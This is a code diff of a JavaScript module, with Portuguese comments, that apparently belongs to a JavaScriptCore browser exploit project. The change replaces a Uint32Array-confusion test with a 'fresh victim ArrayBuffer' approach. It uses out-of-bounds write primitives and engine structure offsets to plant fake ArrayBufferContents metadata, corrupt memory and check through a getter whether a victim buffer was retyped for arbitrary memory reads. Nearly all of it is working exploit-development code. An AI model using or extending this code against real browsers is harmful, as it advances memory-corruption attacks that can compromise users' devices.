@@ -3,51 +3,53 @@ import { logS3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
-    oob_dataview_real,     // A DataView sobre o oob_array_buffer_real
+    oob_array_buffer_real,
+    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
-let getter_called_flag = false; // Renomeado para clareza, escopo do módulo
-let current_test_results = { success: false, message: "Teste não iniciado.", error: null }; // Resultados globais
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForExploit";
+let getter_called_flag = false;
+let current_test_results = { success: false, message: "Teste não iniciado.", error: null };
 
-const ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA = new AdvancedInt64(0x1, 0x0);
-const TAMANHO_ESPERADO_SOMBRA = new AdvancedInt64(0x1000, 0x0); // 4096
+// Metadados sombra que gostaríamos de usar
+const ADDR_TARGET_FOR_SHADOW_AB = new AdvancedInt64(0x1, 0x0); // Onde o AB sombra leria
+const SIZE_TARGET_FOR_SHADOW_AB = new AdvancedInt64(0x1000, 0x0); // Tamanho do AB sombra (4096 bytes)
 
+// Variável para manter a referência ao ArrayBuffer vítima "fresco"
+let fresh_victim_ab_ref;
 
-class CheckpointObjectForExploit { // Nome genérico
+class CheckpointObjectForExploit {
     constructor(id) {
         this.id = `ExploitCheckpoint-${id}`;
     }
 }
 
-export function toJSON_TriggerExploitGetter() { // Nome genérico
+export function toJSON_TriggerExploitGetter() {
     const FNAME_toJSON = "toJSON_TriggerExploitGetter";
     if (this instanceof CheckpointObjectForExploit) {
         logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
         try {
             // eslint-disable-next-line no-unused-vars
-            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
+            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME]; // Aciona o getter
         } catch (e) {
             logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
         }
     }
-    return this.id;
+    return this.id; // Retorno simples
 }
 
-// A função exportada mantém o nome para compatibilidade
-export async function executeRetypeOOB_AB_Test() {
-    const FNAME_TEST = "executeShadowCraftExploitTest"; // Nome interno do teste
-    logS3(`--- Iniciando Teste ShadowCraft com Uint32Array ---`, "test", FNAME_TEST);
+export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
+    const FNAME_TEST = "executeFreshVictimABTest"; // Nome interno do teste
+    logS3(`--- Iniciando Teste com ArrayBuffer Vítima "Fresco" ---`, "test", FNAME_TEST);
 
     getter_called_flag = false;
+    fresh_victim_ab_ref = null; // Reseta a referência
     current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };
 
-    // Validações de config...
     if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
         logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
         current_test_results.message = "Offsets críticos não definidos.";
@@ -69,63 +71,79 @@ export async function executeRetypeOOB_AB_Test() {
         }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
 
-        // 1. Plantar "Metadados Sombra" de ArrayBufferContents no início do buffer de dados do oob_array_buffer_real
-        const shadow_metadata_offset_in_oob_data = 0x0;
-        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, TAMANHO_ESPERADO_SOMBRA, 8);
-        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA, 8);
-        logS3(`Metadados sombra plantados: ptr=${ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA.toString(true)}, size=${TAMANHO_ESPERADO_SOMBRA.toString(true)}`, "info", FNAME_TEST);
+        // 1. Plantar "Metadados Sombra" (para um hipotético ArrayBufferContents)
+        //    no início do buffer de dados do oob_array_buffer_real.
+        //    Este é o ArrayBufferContents FALSO que gostaríamos que um AB vítima usasse.
+        const shadow_contents_offset_in_oob_data = 0x0;
+        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, SIZE_TARGET_FOR_SHADOW_AB, 8);
+        oob_write_absolute(shadow_contents_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ADDR_TARGET_FOR_SHADOW_AB, 8);
+        logS3(`Metadados sombra (ArrayBufferContents falsos) plantados em oob_data[0]: ptr=${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}, size=${SIZE_TARGET_FOR_SHADOW_AB.toString(true)}`, "info", FNAME_TEST);
 
-        // 2. Realizar a escrita OOB "gatilho"
+        // 2. Realizar a escrita OOB "gatilho" que causa a chamada anômala do getter
         const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
         const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
         oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
-        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} completada.`, "info", FNAME_TEST);
+        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} do oob_data completada.`, "info", FNAME_TEST);
 
-        // 3. Configurar o getter e poluir
+        // 3. Criar um ArrayBuffer Vítima "Fresco" *APÓS* a escrita OOB gatilho
+        //    A esperança é que o estado do alocador possa estar alterado.
+        const victim_ab_size = 256;
+        logS3(`Criando ArrayBuffer vítima "fresco" (fresh_victim_ab_ref) com tamanho ${victim_ab_size}...`, "info", FNAME_TEST);
+        fresh_victim_ab_ref = new ArrayBuffer(victim_ab_size);
+        logS3(`fresh_victim_ab_ref criado. byteLength inicial: ${fresh_victim_ab_ref.byteLength}`, "info", FNAME_TEST);
+
+
+        // 4. Configurar o getter e poluir para acionar o ponto de verificação
         const checkpoint_obj = new CheckpointObjectForExploit(1);
         originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);
 
         Object.defineProperty(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
             get: function() {
                 getter_called_flag = true;
-                const FNAME_GETTER = "ExploitTestGetter";
-                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO!`, "vuln", FNAME_GETTER);
-                current_test_results = { success: false, message: "Getter chamado, teste de Uint32Array em andamento.", error: null };
+                const FNAME_GETTER = "FreshVictimAB_Getter";
+                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO! Inspecionando fresh_victim_ab_ref...`, "vuln", FNAME_GETTER);
+                current_test_results = { success: false, message: "Getter chamado, inspecionando fresh_victim_ab_ref.", error: null };
+
+                if (!fresh_victim_ab_ref) {
+                    logS3("DENTRO DO GETTER: fresh_victim_ab_ref é null/undefined!", "error", FNAME_GETTER);
+                    current_test_results.message = "fresh_victim_ab_ref não estava disponível no getter.";
+                    return 0xDEADDEAD;
+                }
 
                 try {
-                    logS3(`DENTRO DO GETTER: Tentando 'new Uint32Array(oob_array_buffer_real)'...`, "info", FNAME_GETTER);
-                    // Tenta criar um Uint32Array diretamente sobre o oob_array_buffer_real.
-                    // Se o oob_array_buffer_real (o objeto JS) foi confundido para ser um ponteiro para
-                    // os metadados sombra (que têm data_ptr=0x1, size=0x1000), esta operação
-                    // poderia tentar criar um Uint32Array sobre a memória em 0x1 com tamanho 0x1000.
-                    let confused_typed_array = new Uint32Array(oob_array_buffer_real);
+                    logS3(`DENTRO DO GETTER: Verificando fresh_victim_ab_ref.byteLength (originalmente ${victim_ab_size})...`, "info", FNAME_GETTER);
+                    const currentVictimLength = fresh_victim_ab_ref.byteLength;
+                    logS3(`DENTRO DO GETTER: fresh_victim_ab_ref.byteLength atual: ${currentVictimLength}`, "info", FNAME_GETTER);
 
-                    // Se chegou aqui, o construtor do Uint32Array aceitou oob_array_buffer_real.
-                    // Isso geralmente significa que ele ainda é visto como um ArrayBuffer válido.
-                    logS3(`DENTRO DO GETTER: Uint32Array criado sobre oob_ab. Length: ${confused_typed_array.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_GETTER);
-
-                    // Se o tamanho do Uint32Array for (TAMANHO_ESPERADO_SOMBRA / 4), isso seria um SINAL FORTE.
-                    if (confused_typed_array.length === (TAMANHO_ESPERADO_SOMBRA.low() / 4) ) {
-                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! Comprimento do Uint32Array (${confused_typed_array.length}) corresponde ao tamanho dos metadados sombra!`, "vuln", FNAME_GETTER);
-                        logS3(`DENTRO DO GETTER: Tentando ler confused_typed_array[0] (deveria ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA.toString(true)})...`, "info", FNAME_GETTER);
-                        let val = confused_typed_array[0]; // Tenta ler de 0x1
-                        current_test_results = { success: true, message: `Uint32Array com tamanho de sombra. Lido de [0x1]: ${toHex(val)} SEM ERRO.`, error: null };
-                        logS3(`DENTRO DO GETTER: Lido de confused_typed_array[0]: ${toHex(val)}.`, "leak", FNAME_GETTER);
+                    if (currentVictimLength === SIZE_TARGET_FOR_SHADOW_AB.low()) {
+                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! fresh_victim_ab_ref.byteLength (${currentVictimLength}) CORRESPONDE ao tamanho dos metadados sombra (${SIZE_TARGET_FOR_SHADOW_AB.low()})!`, "vuln", FNAME_GETTER);
+                        logS3(`DENTRO DO GETTER: Tentando criar DataView sobre fresh_victim_ab_ref e ler de offset 0 (deveria ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)})...`, "info", FNAME_GETTER);
+                        const dvOnVictim = new DataView(fresh_victim_ab_ref);
+                        let val = dvOnVictim.getUint32(0, true); // Tenta ler de ADDR_TARGET_FOR_SHADOW_AB (0x1)
+                        current_test_results = { success: true, message: `fresh_victim_ab_ref RE-TIPADO! byteLength OK. Lido de [${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}]: ${toHex(val)} SEM ERRO.`, error: null };
+                        logS3(`DENTRO DO GETTER: Lido de fresh_victim_ab_ref (re-tipado): ${toHex(val)}.`, "leak", FNAME_GETTER);
                     } else {
-                        // Comportamento normal: Uint32Array é criado sobre o buffer original.
-                        let val_original = confused_typed_array[0];
-                        logS3(`DENTRO DO GETTER: Comprimento do Uint32Array (${confused_typed_array.length}) NÃO corresponde ao tamanho sombra. Lido de offset 0 do buffer original: ${toHex(val_original)}`, "warn", FNAME_GETTER);
-                        current_test_results = { success: false, message: `Uint32Array usou buffer original. Length: ${confused_typed_array.length}, Lido[0]: ${toHex(val_original)}`, error: null };
+                        logS3(`DENTRO DO GETTER: fresh_victim_ab_ref.byteLength (${currentVictimLength}) NÃO corresponde ao tamanho sombra. Comportamento normal.`, "warn", FNAME_GETTER);
+                        // Tentar usar o fresh_victim_ab normalmente para ver se ele está minimamente funcional
+                        const dvNormal = new DataView(fresh_victim_ab_ref);
+                        dvNormal.setUint32(0, 0xBADDBADD, true);
+                        if (dvNormal.getUint32(0, true) === 0xBADDBADD) {
+                            logS3("DENTRO DO GETTER: fresh_victim_ab_ref funciona normalmente para escrita/leitura.", "good", FNAME_GETTER);
+                        } else {
+                            logS3("DENTRO DO GETTER: ERRO ao escrever/ler em fresh_victim_ab_ref (comportamento normal).", "error", FNAME_GETTER);
+                        }
+                        current_test_results.message = `fresh_victim_ab_ref manteve tamanho original (${currentVictimLength}). Funcionalidade normal verificada.`;
                     }
 
                 } catch (e) {
-                    logS3(`DENTRO DO GETTER: ERRO ao tentar 'new Uint32Array(oob_array_buffer_real)': ${e.message}`, "error", FNAME_GETTER);
-                    // Se o erro for RangeError devido ao endereço 0x1, é um sinal de sucesso.
-                    if (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access")) {
-                         logS3(`DENTRO DO GETTER: O erro '${e.message}' PODE SER O CRASH CONTROLADO esperado ao tentar usar 0x1!`, "vuln", FNAME_GETTER);
-                        current_test_results = { success: true, message: `Uint32Array sobre oob_ab causou CRASH CONTROLADO '${e.message}' (provavelmente devido a 0x1).`, error: String(e) };
+                    logS3(`DENTRO DO GETTER: ERRO ao operar em fresh_victim_ab_ref: ${e.message}`, "error", FNAME_GETTER);
+                    // Se o byteLength bateu com o dos metadados sombra E AQUI DEU ERRO, é o esperado para 0x1
+                    if (fresh_victim_ab_ref && fresh_victim_ab_ref.byteLength === SIZE_TARGET_FOR_SHADOW_AB.low() &&
+                        (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access"))) {
+                        logS3(`DENTRO DO GETTER: O erro '${e.message}' é o CRASH CONTROLADO esperado ao tentar ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)} via fresh_victim_ab_ref!`, "vuln", FNAME_GETTER);
+                        current_test_results = { success: true, message: `fresh_victim_ab_ref RE-TIPADO e CRASH CONTROLADO '${e.message}' ao ler de ${ADDR_TARGET_FOR_SHADOW_AB.toString(true)}.`, error: String(e) };
                     } else {
-                        current_test_results = { success: false, message: `Erro inesperado com Uint32Array: ${e.message}`, error: String(e) };
+                        current_test_results = { success: false, message: `Erro inesperado com fresh_victim_ab_ref: ${e.message}`, error: String(e) };
                     }
                 }
                 return 0xBADF00D;
@@ -151,7 +169,7 @@ export async function executeRetypeOOB_AB_Test() {
         console.error(mainError);
         current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
     } finally {
-        // Restauração
+        // Restauração (mantida)
         if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
         if (getterPollutionApplied && CheckpointObjectForExploit.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
         logS3("Limpeza finalizada.", "info", "CleanupFinal");
@@ -159,15 +177,16 @@ export async function executeRetypeOOB_AB_Test() {
 
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE UINT32ARRAY: ${current_test_results.message}`, "vuln", FNAME_TEST);
+            logS3(`RESULTADO TESTE VÍTIMA FRESCA: ${current_test_results.message}`, "vuln", FNAME_TEST);
         } else {
-            logS3(`RESULTADO TESTE UINT32ARRAY: Getter chamado, mas teste não conclusivo. ${current_test_results.message}`, "warn", FNAME_TEST);
+            logS3(`RESULTADO TESTE VÍTIMA FRESCA: Getter chamado, mas sem sucesso. ${current_test_results.message}`, "warn", FNAME_TEST);
         }
     } else {
-        logS3("RESULTADO TESTE UINT32ARRAY: Getter NÃO foi chamado.", "error", FNAME_TEST);
+        logS3("RESULTADO TESTE VÍTIMA FRESCA: Getter NÃO foi chamado.", "error", FNAME_TEST);
     }
     logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);
 
     clearOOBEnvironment();
-    logS3(`--- Teste ShadowCraft com Uint32Array Concluído ---`, "test", FNAME_TEST);
+    fresh_victim_ab_ref = null; // Limpa a referência global
+    logS3(`--- Teste com ArrayBuffer Vítima "Fresco" Concluído ---`, "test", FNAME_TEST);
 }
